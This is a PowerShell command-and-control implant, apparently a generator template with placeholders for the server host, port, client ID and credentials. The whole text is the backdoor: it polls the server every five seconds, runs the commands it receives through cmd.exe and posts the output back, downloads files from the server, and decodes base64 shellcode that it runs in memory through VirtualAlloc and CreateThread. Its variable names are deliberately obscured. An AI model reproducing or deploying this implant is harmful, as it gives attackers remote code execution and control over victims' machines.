$C2_URL = 'http://{lhost}:{lport}'
$CLIENT_ID = '{line}'

function Send-Request {
    param (
        [string]$url,
        [string]$method = 'GET',
        [string]$body = '',
        [string]$username = '{username}',
        [string]$password = '{password}'
    )
    $headers = @{
        'Authorization' = 'Basic ' + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$username`:$password"))
    }
    if ($method -eq 'POST') {
        $headers['Content-Type'] = 'application/json'
    }
    try {
        if ($method -eq 'GET') {
            $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
        } elseif ($method -eq 'POST') {
            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
        } else {
            throw "Unsupported HTTP method: $method"
        }
        return $response
    } catch {
        Write-Error "Error in Send-Request: $_"
        return $null
    }
}
$griscuatr0 = @"
using System;
using System.Runtime.InteropServices;
public class VrtAlloc {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@
Add-Type $griscuatr0
$griscinc0 = @"
using System;
using System.Runtime.InteropServices;
public class WaitFor {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $griscinc0
$grisse1s = @"
using System;
using System.Runtime.InteropServices;
public class CrtThread {
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type $grisse1s
function Escn {
    param (
        [string]$scg
    )
    try {
        
        $grisun0 = [System.Convert]::FromBase64String($scg)
        $grisd0s = [VrtAlloc]::VirtualAlloc(0, $grisun0.Length, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($grisun0, 0, $grisd0s, $grisun0.Length)
        $gristr3s = [CrtThread]::CreateThread(0, 0, $grisd0s, 0, 0, 0)
        [WaitFor]::WaitForSingleObject($gristr3s, [uint32]"0xFFFFFFFF")
    } catch {
        Write-Error "Error in Escn: $_"
    } finally {
        if ($grisd0s -ne [System.IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($grisd0s)
            Write-Output "Freed buffer at: $grisd0s"
        }
    }
}
while ($true) {
    try {
        $command = Send-Request "$C2_URL/command/$CLIENT_ID"
        if ($command) {
            if ($command -match 'terminate') {
                break
            } elseif ($command -match '^sc:') {
                $sc = $command -replace '^sc:', ''
                Escn $sc
            } elseif ($command -match '^download:') {
                $file_path = $command -replace '^download:', ''
                $file_url = "$C2_URL/download/$file_path"
                $file_name = [System.IO.Path]::GetFileName($file_path)
                Invoke-RestMethod -Uri $file_url -Method Get -Headers $headers -OutFile $file_name
                if (Test-Path $file_name) {
                    Write-Output "[INFO] File downloaded: $file_name"
                } else {
                    Write-Error "[ERROR] File download failed: $file_name"
                }
            } else {
                $output = cmd.exe /c $command 2>&1
                $json_data = @{ output = $output } | ConvertTo-Json -Depth 10
                Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
            }
        }
        Start-Sleep -Seconds 5
    } catch {
        Write-Error "Error in main loop: $_"
        break
    }
}
